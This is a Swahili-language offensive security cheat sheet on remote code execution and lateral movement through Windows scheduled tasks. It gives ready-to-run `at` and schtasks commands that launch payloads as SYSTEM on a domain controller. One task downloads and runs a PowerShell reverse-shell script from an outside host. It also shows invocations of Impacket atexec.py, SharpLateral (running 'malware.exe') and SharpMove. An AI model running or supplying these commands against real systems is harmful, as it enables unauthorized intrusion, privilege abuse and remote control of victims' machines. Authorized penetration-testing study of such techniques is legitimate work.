# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## Jinsi inavyofanya kazi

Kwa kutumia ufikiaji wa kiutawala kwenye host ya Windows, operator anaweza kuunda na kuanzisha task iliyopangwa kwa mbali. Chaguo la `/S` huchagua host ya mbali, `/U` na `/P` hutoa credentials za kuunda task inapohitajika, na `/RU` huchagua akaunti ambayo task itaendeshwa chini yake. Command inayorejelewa na `/TR` lazima iwepo kwenye mfumo wa mbali.<sup>[[1]](#references)</sup>

Command ya zamani ya `at` pia inaweza kupanga command kwenye host ya mbali wakati service ya Schedule inaendeshwa. Huendesha kazi zilizopangwa chini ya service account, ambayo kwa kawaida ni `SYSTEM`:<sup>[[5]](#references)</sup>
```cmd
at \\victim 23:00 shutdown -r
```
Unda task hiyo kisha ianzishe:
```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```
Kwa mfano:
```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
Kwa kazi ya kila wiki inayojirudia, tumia ratiba halali ya kila wiki na taja siku wazi:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```
Kitendo cha task kinaweza pia kuinvoke PowerShell moja kwa moja. Mfano ufuatao wa maabara hudownload na kuendesha script; host payload kwenye infrastructure iliyoidhinishwa kwa ajili ya assessment:
```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```
`atexec.py` ya Impacket huendesha kiotomatiki utekelezaji wa amri za mbali kupitia Task Scheduler service na hukubali uthibitishaji kwa nenosiri, NTLM-hash, au Kerberos.<sup>[[2]](#references)</sup>
```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```
SharpLateral hutoa mbinu ya utekelezaji wa scheduled task:<sup>[[3]](#references)</sup>
```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```
SharpMove hutoa utekelezaji mwingine wa Task Scheduler:<sup>[[4]](#references)</sup>
```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```
Maelezo zaidi kuhusu [**matumizi ya schtasks na silver tickets hapa**](../active-directory-methodology/silver-ticket.md#host).

Ondoa tasks za majaribio baada ya matumizi:
```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```
## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)
{{#include ../../banners/hacktricks-training.md}}
